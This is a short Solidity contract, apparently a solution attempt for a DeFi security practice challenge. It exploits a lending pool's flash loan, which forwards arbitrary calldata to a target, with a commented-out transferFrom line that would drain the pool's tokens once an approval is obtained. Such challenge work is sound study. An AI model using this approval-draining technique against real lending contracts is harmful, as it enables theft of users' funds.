// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";

contract AttackFree {
    TrusterLenderPool free;
    IERC20 public immutable token;

    constructor(address _free, address tokenAddress) {
        free = TrusterLenderPool(_free);
        token = IERC20(tokenAddress);
    }

    function attack(uint256 amount, address borrower, address target, bytes calldata data) external {
        free.flashLoan(amount, borrower, target, data);
        // Once approved transfer
        // token.transferFrom(address(free), msg.sender, 1000000 ether);
    }
}
